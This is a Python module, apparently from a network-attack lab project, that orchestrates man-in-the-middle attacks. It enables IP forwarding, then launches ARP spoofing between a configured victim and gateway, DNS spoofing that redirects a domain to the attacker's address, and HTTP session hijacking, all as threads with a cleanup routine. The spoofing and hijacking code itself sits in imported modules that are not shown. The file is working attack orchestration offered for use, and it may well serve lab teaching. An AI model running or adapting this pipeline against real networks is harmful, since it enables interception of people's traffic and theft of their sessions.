import time
import os

from src.attacks.arp_spoofing import start_arp_spoof
from src.attacks.dns_spoofing import DnsSpoofingAttack
from src.attacks.HTTP_session_hijacking import HTTPSessionHijacker
# from src.attacks.ssl_strip import SslStripAttack # Placeholder for when SSL strip is implemented

from .config import load_config
from .network import check_lab_reachability, enable_ip_forwarding

""" src/core/mitm_pipeline.py: Module for managing MITM attack pipelines.
    Provides functions to set up, monitor, and tear down MITM attack pipelines. """

def teardown_pipeline(running_threads: dict):
    """Stops all running attack threads and restores network state."""
    print("\n[INFO] Starting MITM pipeline teardown...")

    # Stop all running attack threads
    for name, thread in running_threads.items():
        if thread.is_alive():
            print(f"[INFO] Stopping {name} thread...")
            thread.stop()
            thread.join(timeout=5)
            if thread.is_alive():
                print(f"[WARNING] {name} thread did not terminate gracefully.")

    # Disable IP forwarding after all attacks are stopped
    try:
        if os.name == 'posix':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
            print("[INFO] IP forwarding disabled.")
    except Exception as e:
        print(f"[ERROR] Failed to disable IP forwarding: {e}")

    print("[INFO] Teardown complete. Exiting.")

def run(mode: str):
    """ Run the MITM pipeline based on the specified mode. """
    config = load_config()
    running_threads = {}

    try:
        # Initial setup and validation
        # Note: A bug in the original check_lab_reachability has been noted, but not fixed here.
        # reachability = check_lab_reachability()
        # if not all(reachability.values()):
        #     print("One or more lab components are unreachable.")
        #     return

        if not enable_ip_forwarding():
            raise RuntimeError("Failed to enable IP forwarding. Cannot proceed with MITM.")

        # --- Start Foundational Attacks ---
        # ARP Spoofing is foundational for most MITM attacks.
        if "arp" in mode or "dns" in mode or "ssl" in mode:
            victim_ip = config["victim"]["ip"]
            gateway_ip = config["gateway"]["ip"]
            arp_spoofer = start_arp_spoof(victim_ip, gateway_ip)
            if arp_spoofer:
                running_threads['arp'] = arp_spoofer
            else:
                raise RuntimeError("ARP Spoofing failed to start. Cannot proceed.")

        # --- Start Payload Attacks ---
        # These attacks run concurrently after the MITM is established.
        if "dns" in mode:
            domain_name = config["domain"]["name"]
            attacker_ip = config["attacker"]["ip"]
            dns_spoofer = DnsSpoofingAttack(domain=domain_name, fake_ip=attacker_ip)
            dns_spoofer.start()
            running_threads['dns'] = dns_spoofer
        
        if "ssl" in mode:
            print("[WARNING] SSL Stripping is not yet implemented.")
            # When implemented, it would be another thread:
            # ssl_stripper = SslStripAttack()
            # ssl_stripper.start()
            # running_threads['ssl'] = ssl_stripper

        if "session" in mode:
            hijacker = HTTPSessionHijacker(
                target_domain=config["domain"]["name"],
                target_ip=config["attacker"]["ip"],
                victim_ip=config["victim"]["ip"],
                interface=config["attacker"]["interface"]
            )
            hijacker.start()
            running_threads["session"] = hijacker

        # Keep the main thread alive while attacks are running
        if running_threads:
            print(f"\n[INFO] MITM pipeline running with modes: {list(running_threads.keys())}.")
            print("Press Ctrl+C to stop attacks and restore network state.")
            while True:
                time.sleep(1)
        else:
            print(f"Unknown or no mode specified: {mode}")

    except KeyboardInterrupt:
        print("\n[INTERRUPT] Received user interrupt (Ctrl+C).")
    except Exception as e:
        print(f"[FATAL ERROR] Pipeline terminated unexpectedly: {e}")
    finally:
        # Ensure cleanup runs regardless of how the script exits
        teardown_pipeline(running_threads)

